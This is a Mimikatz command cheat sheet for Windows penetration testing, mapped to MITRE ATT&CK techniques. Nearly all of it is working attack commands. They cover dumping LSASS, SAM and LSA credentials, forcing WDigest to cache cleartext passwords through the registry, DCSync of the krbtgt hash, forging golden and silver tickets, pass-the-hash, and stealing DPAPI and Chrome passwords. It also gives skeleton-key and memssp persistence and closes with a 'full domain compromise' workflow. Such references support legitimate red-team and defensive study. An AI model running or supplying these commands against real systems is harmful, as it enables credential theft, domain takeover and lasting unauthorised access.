# Mimikatz Command Reference

Complete reference for credential extraction during Windows penetration tests.

**MITRE ATT&CK**: T1003, T1558, T1552

## Setup

```cmd
:: Run as admin, enable debug privilege
mimikatz # privilege::debug
mimikatz # token::elevate
```

## Credential Extraction

### Dump Logon Passwords (T1003.001)

```
sekurlsa::logonpasswords
```
Extracts NTLM hashes, Kerberos tickets, and cleartext passwords (if WDigest enabled) from LSASS memory.

### Enable WDigest Cleartext (pre-dump)

```cmd
:: Force cleartext password caching (requires reboot or new logon)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

```
sekurlsa::wdigest
```

### Dump SAM Database (T1003.002)

```
lsadump::sam
lsadump::sam /system:SYSTEM /sam:SAM
```
Local account NTLM hashes from the SAM hive.

### DCSync (T1003.006)

```
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /all /csv
```
Simulates a Domain Controller replication request. Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All (Domain Admins, Enterprise Admins, or explicit delegation).

### Dump LSA Secrets (T1003.004)

```
lsadump::secrets
```
Service account passwords, cached domain credentials, auto-logon passwords.

### Cached Domain Credentials (T1003.005)

```
lsadump::cache
```
DCC2 hashes — crackable offline with hashcat mode 2100.

## Kerberos Attacks

### Golden Ticket (T1558.001)

```
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /groups:512 /ptt
```
Forges a TGT. Requires: krbtgt NTLM hash (from DCSync).

### Silver Ticket (T1558.002)

```
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:dc01.corp.local /service:cifs /rc4:SERVICE_HASH /ptt
```
Forges a TGS for a specific service. Requires: service account NTLM hash.

### Pass-the-Ticket

```
kerberos::ptt ticket.kirbi
kerberos::list
```

### Kerberoasting (Offline)

```
kerberos::ask /target:MSSQLSvc/db01.corp.local:1433
```

### Export All Tickets

```
sekurlsa::tickets /export
```

## DPAPI

### Credential Manager (T1555.004)

```
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\<GUID>
dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\<SID>\<GUID> /rpc
```

### Vault Credentials

```
vault::cred
vault::list
```

### Chrome Saved Passwords

```
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## Token Manipulation

```
token::elevate                    # Impersonate SYSTEM
token::elevate /domainadmin       # Impersonate domain admin (if token exists)
token::revert                     # Revert to original token
token::list                       # List available tokens
```

## Certificates (T1649)

```
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /systemstore:local_machine /export
```

## Pass-the-Hash

```
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:cmd.exe
```

## Misc Useful

```
misc::skeleton           # Skeleton key attack (T1556.001) — inject into DC LSASS
misc::memssp             # Memory-resident SSP (logs cleartext to C:\Windows\System32\mimilsa.log)
lsadump::trust           # Domain trust keys
lsadump::backupkeys      # DPAPI backup keys from DC
```

## Common Workflows

```
# Quick credential dump
privilege::debug
sekurlsa::logonpasswords

# Full domain compromise
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Persistence via skeleton key (on DC)
privilege::debug
misc::skeleton
# Any user can now authenticate with password "mimikatz"
```
